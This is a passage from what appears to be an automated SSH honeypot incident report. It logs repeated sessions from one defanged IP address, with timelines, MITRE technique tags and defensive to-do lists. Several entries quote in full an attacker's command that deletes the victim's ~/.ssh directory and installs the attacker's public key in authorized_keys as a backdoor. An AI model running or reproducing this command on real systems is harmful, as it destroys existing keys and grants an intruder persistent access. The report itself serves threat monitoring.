| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 12:51:26` | `cowrie.session.connect` |
| `2026-05-05 12:51:26` | `cowrie.client.version` |
| `2026-05-05 12:51:26` | `cowrie.client.kex` |
| `2026-05-05 12:51:27` | `cowrie.login.success` |
| `2026-05-05 12:51:28` | `cowrie.session.params` |
| `2026-05-05 12:51:28` | `cowrie.command.input` |
| `2026-05-05 12:51:28` | `cowrie.command.failed` |
| `2026-05-05 12:51:28` | `cowrie.log.closed` |
| `2026-05-05 12:51:29` | `cowrie.session.params` |
| `2026-05-05 12:51:29` | `cowrie.command.input` |
| `2026-05-05 12:51:29` | `cowrie.session.file_download` |
| `2026-05-05 12:51:29` | `cowrie.log.closed` |
| `2026-05-05 12:51:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ffcece23577

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 12:51 |
| **Last Seen** | 2026-05-05 12:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 12:51:32` | `cowrie.session.connect` |
| `2026-05-05 12:51:32` | `cowrie.client.version` |
| `2026-05-05 12:51:33` | `cowrie.client.kex` |
| `2026-05-05 12:51:34` | `cowrie.login.success` |
| `2026-05-05 12:51:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1a8d32d0d2a

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 12:53 |
| **Last Seen** | 2026-05-05 12:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 12:53:24` | `cowrie.session.connect` |
| `2026-05-05 12:53:24` | `cowrie.client.version` |
| `2026-05-05 12:53:24` | `cowrie.client.kex` |
| `2026-05-05 12:53:25` | `cowrie.login.success` |
| `2026-05-05 12:53:25` | `cowrie.session.params` |
| `2026-05-05 12:53:25` | `cowrie.command.input` |
| `2026-05-05 12:53:25` | `cowrie.command.failed` |
| `2026-05-05 12:53:26` | `cowrie.log.closed` |
| `2026-05-05 12:53:26` | `cowrie.session.params` |
| `2026-05-05 12:53:26` | `cowrie.command.input` |
| `2026-05-05 12:53:27` | `cowrie.session.file_download` |
| `2026-05-05 12:53:27` | `cowrie.log.closed` |
| `2026-05-05 12:53:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8da6691d4a2a

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 12:53 |
| **Last Seen** | 2026-05-05 12:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 12:53:30` | `cowrie.session.connect` |
| `2026-05-05 12:53:30` | `cowrie.client.version` |
| `2026-05-05 12:53:31` | `cowrie.client.kex` |
| `2026-05-05 12:53:32` | `cowrie.login.success` |
| `2026-05-05 12:53:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ce9b0ee47bd

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 12:54 |
| **Last Seen** | 2026-05-05 12:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 12:54:24` | `cowrie.session.connect` |
| `2026-05-05 12:54:24` | `cowrie.client.version` |
| `2026-05-05 12:54:25` | `cowrie.client.kex` |
| `2026-05-05 12:54:26` | `cowrie.login.success` |
| `2026-05-05 12:54:26` | `cowrie.session.params` |
| `2026-05-05 12:54:26` | `cowrie.command.input` |
| `2026-05-05 12:54:26` | `cowrie.command.failed` |
| `2026-05-05 12:54:26` | `cowrie.log.closed` |
| `2026-05-05 12:54:27` | `cowrie.session.params` |
| `2026-05-05 12:54:27` | `cowrie.command.input` |
| `2026-05-05 12:54:27` | `cowrie.session.file_download` |
| `2026-05-05 12:54:27` | `cowrie.log.closed` |
| `2026-05-05 12:54:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bbdb9625ae9

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 12:54 |
| **Last Seen** | 2026-05-05 12:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 12:54:31` | `cowrie.session.connect` |
| `2026-05-05 12:54:31` | `cowrie.client.version` |
| `2026-05-05 12:54:31` | `cowrie.client.kex` |
| `2026-05-05 12:54:32` | `cowrie.login.success` |
| `2026-05-05 12:54:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7741ebfcaecc

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 12:55 |
| **Last Seen** | 2026-05-05 12:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 12:55:23` | `cowrie.session.connect` |
| `2026-05-05 12:55:23` | `cowrie.client.version` |
| `2026-05-05 12:55:23` | `cowrie.client.kex` |
| `2026-05-05 12:55:24` | `cowrie.login.success` |
| `2026-05-05 12:55:25` | `cowrie.session.params` |
| `2026-05-05 12:55:25` | `cowrie.command.input` |
| `2026-05-05 12:55:25` | `cowrie.command.failed` |
| `2026-05-05 12:55:25` | `cowrie.log.closed` |
| `2026-05-05 12:55:26` | `cowrie.session.params` |
| `2026-05-05 12:55:26` | `cowrie.command.input` |
| `2026-05-05 12:55:26` | `cowrie.session.file_download` |
| `2026-05-05 12:55:26` | `cowrie.log.closed` |
| `2026-05-05 12:55:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e9ff567c188

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 12:55 |
| **Last Seen** | 2026-05-05 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 12:55:29` | `cowrie.session.connect` |
| `2026-05-05 12:55:29` | `cowrie.client.version` |
| `2026-05-05 12:55:30` | `cowrie.client.kex` |
| `2026-05-05 12:55:31` | `cowrie.login.success` |
| `2026-05-05 12:55:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66f062dfcac0

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 12:57 |
| **Last Seen** | 2026-05-05 12:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 12:57:10` | `cowrie.session.connect` |
| `2026-05-05 12:57:10` | `cowrie.client.version` |
| `2026-05-05 12:57:10` | `cowrie.client.kex` |
| `2026-05-05 12:57:11` | `cowrie.login.success` |
| `2026-05-05 12:57:12` | `cowrie.session.params` |
| `2026-05-05 12:57:12` | `cowrie.command.input` |
| `2026-05-05 12:57:12` | `cowrie.command.failed` |
| `2026-05-05 12:57:12` | `cowrie.log.closed` |
| `2026-05-05 12:57:13` | `cowrie.session.params` |
| `2026-05-05 12:57:13` | `cowrie.command.input` |
| `2026-05-05 12:57:13` | `cowrie.session.file_download` |
| `2026-05-05 12:57:13` | `cowrie.log.closed` |
| `2026-05-05 12:57:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e39e4a795b93

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 12:57 |
| **Last Seen** | 2026-05-05 12:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 12:57:16` | `cowrie.session.connect` |
| `2026-05-05 12:57:16` | `cowrie.client.version` |
| `2026-05-05 12:57:16` | `cowrie.client.kex` |
| `2026-05-05 12:57:18` | `cowrie.login.success` |
| `2026-05-05 12:57:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c117b470065

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 12:58 |
| **Last Seen** | 2026-05-05 12:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 12:58:59` | `cowrie.session.connect` |
| `2026-05-05 12:58:59` | `cowrie.client.version` |
| `2026-05-05 12:58:59` | `cowrie.client.kex` |
| `2026-05-05 12:59:00` | `cowrie.login.success` |
| `2026-05-05 12:59:01` | `cowrie.session.params` |
| `2026-05-05 12:59:01` | `cowrie.command.input` |
| `2026-05-05 12:59:01` | `cowrie.command.failed` |
| `2026-05-05 12:59:01` | `cowrie.log.closed` |
| `2026-05-05 12:59:02` | `cowrie.session.params` |
| `2026-05-05 12:59:02` | `cowrie.command.input` |
| `2026-05-05 12:59:02` | `cowrie.session.file_download` |
| `2026-05-05 12:59:02` | `cowrie.log.closed` |
| `2026-05-05 12:59:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8e9ece007ad

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 12:59 |
| **Last Seen** | 2026-05-05 12:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 12:59:05` | `cowrie.session.connect` |
| `2026-05-05 12:59:05` | `cowrie.client.version` |
| `2026-05-05 12:59:05` | `cowrie.client.kex` |
| `2026-05-05 12:59:06` | `cowrie.login.success` |
| `2026-05-05 12:59:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66c27655bcf9

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 13:02 |
| **Last Seen** | 2026-05-05 13:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 13:02:42` | `cowrie.session.connect` |
| `2026-05-05 13:02:42` | `cowrie.client.version` |
| `2026-05-05 13:02:42` | `cowrie.client.kex` |
| `2026-05-05 13:02:43` | `cowrie.login.success` |
| `2026-05-05 13:02:44` | `cowrie.session.params` |
| `2026-05-05 13:02:44` | `cowrie.command.input` |
| `2026-05-05 13:02:44` | `cowrie.command.failed` |
| `2026-05-05 13:02:44` | `cowrie.log.closed` |
| `2026-05-05 13:02:45` | `cowrie.session.params` |
| `2026-05-05 13:02:45` | `cowrie.command.input` |
| `2026-05-05 13:02:45` | `cowrie.session.file_download` |
| `2026-05-05 13:02:45` | `cowrie.log.closed` |
| `2026-05-05 13:02:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ea4810e261f

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 13:02 |
| **Last Seen** | 2026-05-05 13:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 13:02:48` | `cowrie.session.connect` |
| `2026-05-05 13:02:48` | `cowrie.client.version` |
| `2026-05-05 13:02:49` | `cowrie.client.kex` |
| `2026-05-05 13:02:50` | `cowrie.login.success` |
| `2026-05-05 13:02:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f57d92b67816

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 13:03 |
| **Last Seen** | 2026-05-05 13:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 13:03:38` | `cowrie.session.connect` |
| `2026-05-05 13:03:38` | `cowrie.client.version` |
| `2026-05-05 13:03:39` | `cowrie.client.kex` |
| `2026-05-05 13:03:40` | `cowrie.login.success` |
| `2026-05-05 13:03:40` | `cowrie.session.params` |
| `2026-05-05 13:03:40` | `cowrie.command.input` |
| `2026-05-05 13:03:40` | `cowrie.command.failed` |
| `2026-05-05 13:03:41` | `cowrie.log.closed` |
| `2026-05-05 13:03:41` | `cowrie.session.params` |
| `2026-05-05 13:03:41` | `cowrie.command.input` |
| `2026-05-05 13:03:41` | `cowrie.session.file_download` |
| `2026-05-05 13:03:41` | `cowrie.log.closed` |
| `2026-05-05 13:03:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26e72ff6bf4d

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 13:03 |
| **Last Seen** | 2026-05-05 13:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 13:03:45` | `cowrie.session.connect` |
| `2026-05-05 13:03:45` | `cowrie.client.version` |
| `2026-05-05 13:03:45` | `cowrie.client.kex` |
| `2026-05-05 13:03:46` | `cowrie.login.success` |
| `2026-05-05 13:03:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f6e48e9c901

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 13:04 |
| **Last Seen** | 2026-05-05 13:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 13:04:35` | `cowrie.session.connect` |
| `2026-05-05 13:04:35` | `cowrie.client.version` |
| `2026-05-05 13:04:36` | `cowrie.client.kex` |
| `2026-05-05 13:04:37` | `cowrie.login.success` |
| `2026-05-05 13:04:37` | `cowrie.session.params` |
| `2026-05-05 13:04:37` | `cowrie.command.input` |
